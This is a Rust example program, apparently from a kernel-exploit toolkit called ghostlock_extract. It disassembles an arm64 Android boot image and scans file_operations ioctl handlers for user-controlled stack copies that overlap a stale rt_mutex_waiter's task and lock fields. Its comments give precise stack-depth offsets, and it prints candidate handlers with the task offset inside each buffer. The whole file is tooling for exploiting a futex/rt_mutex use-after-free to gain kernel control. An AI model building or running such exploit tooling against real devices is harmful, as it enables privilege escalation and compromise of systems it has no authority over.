// Scan file_operations ioctl handlers for a copy_from_user/sockptr stack buffer
// that lands on the stale rt_mutex_waiter's task/lock fields.
//
// A file_operations ioctl is reached as: __arm64_sys_ioctl -> (bh/security) ->
// blr f_op->unlocked_ioctl, so the only frame above the handler is the syscall
// entry. The waiter's task/lock sit at syscall depth 0x150/0x148 (futex waiter
// base 0x1a0 below the entry, task 0x50, lock 0x58). A copy at sp+d inside a
// handler of frame F puts its buffer base at depth F-sysdepth-d, so
// task_off_in_buf = (sysframe + F - d) - 0x150.
//
// Usage: cargo run --release --example route_scan -- <boot.img> [sysframe]
use ghostlock_extract::boot::BootImage;
use ghostlock_extract::derive::{self, relative_symbols};
use ghostlock_extract::kallsyms;
use ghostlock_extract::{disasm, kallsyms_finder};
use std::collections::BTreeSet;

fn main() -> anyhow::Result<()> {
    let a: Vec<String> = std::env::args().collect();
    let boot = BootImage::load(std::path::Path::new(&a[1]))?;
    let ks = kallsyms_finder::recover(&boot.kernel, boot.embedded_btf_at().as_ref().map(|(o, b)| (*o, b.len())))
        .map_err(|e| anyhow::anyhow!("{e}"))?;
    let base = kallsyms::unique(&ks.symbols, "_text").or_else(|| kallsyms::unique(&ks.symbols, "_head")).unwrap();
    let (rel, sorted) = relative_symbols(&ks.symbols, base);
    let sysframe = a.get(2).and_then(|s| u64::from_str_radix(s.trim_start_matches("0x"), 16).ok()).unwrap_or(0x50);
    let is_copy = |n: &str| n.contains("copy") && (n.contains("from_user") || n.contains("from_sockptr") || n.contains("from_iter"));
    let copy_addrs: BTreeSet<u64> = rel.iter().filter(|(n, _)| is_copy(n)).flat_map(|(_, x)| x.iter().copied()).collect();
    let mut rows = Vec::new();
    for (name, off) in rel.iter().flat_map(|(n, x)| x.iter().map(|o| (n.clone(), *o))) {
        if name.contains('.') { continue; }
        let stop = sorted.iter().find(|v| **v > off).copied().unwrap_or(off + 0x3000);
        let Ok(lines) = disasm::disassemble_range(&boot.kernel, off as usize, stop.min(off + 0x3000) as usize) else { continue };
        if lines.len() < 4 { continue; }
        let frame = disasm::first_sp_frame(&lines, &name).unwrap_or(0);
        if frame == 0 { continue; }
        let sum = sysframe + frame;
        for (i, line) in lines.iter().enumerate() {
            let Some(h) = line.strip_prefix("bl 0x") else { continue };
            let Ok(t) = u64::from_str_radix(h.trim(), 16) else { continue };
            if !copy_addrs.contains(&t) { continue; }
            let mut dest = None; let mut size = 0u64;
            for j in (i.saturating_sub(30)..i).rev() {
                if dest.is_none() {
                    if lines[j] == "mov x0, sp" { dest = Some(0); }
                    if let Some(r) = lines[j].strip_prefix("add x0, sp, #0x") { if let Ok(v) = u64::from_str_radix(r.trim(), 16) { dest = Some(v); } }
                }
                if size == 0 { for p in ["mov w2, #0x", "mov x2, #0x"] { if let Some(r) = lines[j].strip_prefix(p) { if let Ok(v) = u64::from_str_radix(r.trim(), 16) { size = v; } } } }
                if dest.is_some() && size != 0 { break; }
            }
            if let Some(d) = dest {
                if size < 0x60 { continue; }
                // Handler sp sits at syscall depth `sum`; a buffer copied to
                // sp+d therefore spans depths [sum-d-size, sum-d]. Let
                // base = sum-d be its deeper end. The stale waiter occupies
                // depths [0x130, 0x1a0] (waiter base/tree at 0x1a0, ww_ctx end
                // at 0x130), so the buffer covers it when base >= 0x1a0 and
                // base-size <= 0x130; waiter_off = base-0x1a0 is the byte
                // offset of the waiter base inside the buffer.
                let base = sum as i64 - d as i64;
                if base >= 0x1a0 && base - size as i64 <= 0x130 {
                    rows.push((name.clone(), sum, d, size, base - 0x1a0));
                }
            }
        }
    }
    rows.sort_by_key(|r| r.4);
    for r in &rows {
        println!("HIT {:<34} sum={:#06x} off=sp+{:#05x} size={:#06x} task_in_buf={:#x}", r.0, r.1, r.2, r.3, r.4);
    }
    eprintln!("hits: {}", rows.len());
    Ok(())
}
